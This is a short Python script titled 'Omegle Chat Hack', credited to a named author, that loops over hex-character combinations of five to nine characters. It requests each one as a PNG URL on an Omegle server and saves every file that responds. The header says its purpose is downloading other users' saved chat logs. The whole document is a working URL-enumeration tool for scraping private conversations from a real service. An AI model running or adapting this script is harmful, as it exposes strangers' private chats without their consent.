# Omegle-Chat_hack
# Made by - Indrajeet Bhuyan (www.hackatrick.com)
#
#
# Version: 0.1
# Date:    07-08-2016 (dd-mm-yyyy)
#
# Version 0.2
# Date:     19-08-2016
#
# This tool downloads random chat logs which are saved in omegle's server.

# f=str(0)


import itertools
import urllib.request

print("\t\t----------Omegle Chat Hack----------\n")

url="http://l.omegle.com/"

stuff = [ "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f" ]
for L in range(5, 10):
  for i in itertools.combinations_with_replacement(stuff, L):

    finalurl=url+str(''.join(i))+".png"

    omRequest = urllib.request.Request(finalurl)
    try :
            req = urllib.request.urlopen(omRequest)
            print('Chat downloaded \n***********************\n')
            filename = str(''.join(i))+".png"
            output = open(filename,"wb")
            output.write(req.read())
            output.close()
    except  urllib.error.URLError as e:
            print("Unsuccessful")
            continue
